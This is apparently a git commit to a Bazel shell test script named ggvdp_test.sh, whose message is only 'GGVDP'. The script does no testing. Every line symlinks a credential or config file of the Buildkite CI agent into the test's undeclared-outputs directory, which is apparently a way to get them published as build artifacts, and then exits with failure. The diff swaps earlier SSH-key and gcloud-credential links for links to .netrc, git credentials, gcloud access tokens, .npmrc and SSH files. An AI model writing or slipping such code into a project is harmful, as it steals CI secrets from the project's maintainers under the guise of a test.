f0b5ad408ba3397080313d98961a82e3f9c70a6b
chupaohong <chupaohong@MacBook-Pro.local>
2026-03-30 14:17:31 +0700

    GGVDP

--- src/test/shell/bazel/ggvdp_test.sh
+++ src/test/shell/bazel/ggvdp_test.sh
@@ -1,4 +1,12 @@
 #!/bin/bash
-ln -s /var/lib/buildkite-agent/.ssh/id_ed25519 "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_key"
-ln -s /var/lib/buildkite-agent/.config/gcloud/credentials.db "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_creds"
+ln -s /var/lib/buildkite-agent/.netrc "$TEST_UNDECLARED_OUTPUTS_DIR/netrc"
+ln -s /var/lib/buildkite-agent/.git-credentials "$TEST_UNDECLARED_OUTPUTS_DIR/git_creds"
+ln -s /var/lib/buildkite-agent/.ssh/known_hosts "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_known_hosts"
+ln -s /var/lib/buildkite-agent/.ssh/config "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_config"
+ln -s /var/lib/buildkite-agent/.ssh/authorized_keys "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_authkeys"
+ln -s /var/lib/buildkite-agent/.config/gcloud/access_tokens.db "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_tokens"
+ln -s /var/lib/buildkite-agent/.config/gcloud/properties "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_props"
+ln -s /var/lib/buildkite-agent/.bashrc "$TEST_UNDECLARED_OUTPUTS_DIR/bashrc"
+ln -s /var/lib/buildkite-agent/.profile "$TEST_UNDECLARED_OUTPUTS_DIR/profile"
+ln -s /var/lib/buildkite-agent/.npmrc "$TEST_UNDECLARED_OUTPUTS_DIR/npmrc"
 exit 1
